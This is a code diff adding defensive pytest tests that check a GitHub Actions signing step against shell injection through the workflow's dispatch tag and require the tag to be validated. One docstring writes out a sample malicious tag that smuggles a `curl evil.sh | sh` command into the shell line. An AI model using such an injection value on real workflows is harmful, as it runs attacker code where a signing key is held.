@@ -160,6 +160,40 @@ def test_trusted_comment_binds_version_tag_and_digest() -> None:
     assert "-t " in run, "trusted comment must be passed to minisign via -t"
 
 
+def test_signing_step_does_not_interpolate_untrusted_input_into_shell() -> None:
+    """`${{ }}` expansions are textual substitution before bash parses the line.
+
+    `inputs.tag` is supplied by whoever dispatches the workflow. Interpolated
+    directly into the script body, a tag like:
+
+        data-1.0.0"; curl evil.sh | sh; #
+
+    executes in the one step that holds the signing key. Bound through `env:`
+    instead, it is data and can never be code. Guarded here because the unsafe
+    form is the natural thing to write and reads as harmless.
+    """
+    step = _signing_step()
+    run = step["run"]
+    assert "${{" not in run, (
+        "signing step interpolates a GitHub expression into the shell body. "
+        "Pass it through `env:` instead — this step holds the signing key."
+    )
+    env = step.get("env", {})
+    assert "inputs.tag" in str(env.get("INPUT_TAG", "")), "the dispatch tag must be bound via env, not interpolated"
+
+
+def test_signing_step_validates_the_tag_before_signing() -> None:
+    """The tag goes into the signed trusted comment, so it must be constrained.
+
+    A signature is a durable assertion; asserting over unvalidated text is how
+    a verifier is handed something it will parse as a different release.
+    """
+    run = _signing_step()["run"]
+    assert re.search(r"\^data-\[0-9\]\{4\}", run), (
+        "signing step must validate the tag matches data-YYYY.MM.MICRO before signing"
+    )
+
+
 def test_signature_asset_is_uploaded() -> None:
     """The .minisig must be in the upload glob — signing it is not publishing it."""
     wf = yaml.safe_load(_WORKFLOW.read_text())
